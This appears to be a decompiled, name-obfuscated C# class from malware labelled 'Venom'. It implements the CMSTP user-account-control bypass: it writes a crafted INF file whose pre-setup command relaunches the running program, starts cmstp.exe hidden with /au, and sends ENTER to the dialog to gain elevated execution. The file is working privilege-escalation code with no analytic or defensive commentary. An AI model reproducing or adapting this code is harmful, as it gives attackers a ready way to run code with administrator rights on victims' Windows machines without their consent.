using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class GClass34
{
	public static string string_0 = "[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n; Commands Here will be run Before Setup Begins to install\r\nREPLACE_COMMAND_LINE\r\ntaskkill /IM cmstp.exe /F\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"Venom\"\r\nShortSvcName=\"Venom\"\r\n\r\n";

	public static string string_1 = "c:\\windows\\system32\\cmstp.exe";

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	public static string smethod_0(string CommandToExecute)
	{
		string value = Path.GetRandomFileName().Split(new char[1] { Convert.ToChar(".") })[0];
		string value2 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp";
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(value2);
		stringBuilder.Append("\\");
		stringBuilder.Append(value);
		stringBuilder.Append(".inf");
		StringBuilder stringBuilder2 = new StringBuilder(string_0);
		stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
		File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());
		return stringBuilder.ToString();
	}

	public static void smethod_1()
	{
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule!.FileName;
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(smethod_0("cmd /c start \"" + fileName + "\""));
			Process.Start(new ProcessStartInfo(string_1)
			{
				Arguments = "/au " + stringBuilder.ToString(),
				UseShellExecute = false,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden
			});
			IntPtr intPtr = default(IntPtr);
			intPtr = IntPtr.Zero;
			do
			{
				intPtr = smethod_2("cmstp");
			}
			while (intPtr == IntPtr.Zero);
			Class9.Sleep(500);
			SendKeys.SendWait("{ENTER}");
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static IntPtr smethod_2(string ProcessName)
	{
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		if (processesByName.Length == 0)
		{
			return IntPtr.Zero;
		}
		processesByName[0].Refresh();
		IntPtr intPtr = default(IntPtr);
		intPtr = processesByName[0].MainWindowHandle;
		if (intPtr == IntPtr.Zero)
		{
			return IntPtr.Zero;
		}
		SetForegroundWindow(intPtr);
		ShowWindow(intPtr, 5);
		return intPtr;
	}

	private static byte[] smethod_3(string file)
	{
		return (byte[])new ResourceManager("#resource", Assembly.GetExecutingAssembly()).GetObject(file);
	}
}
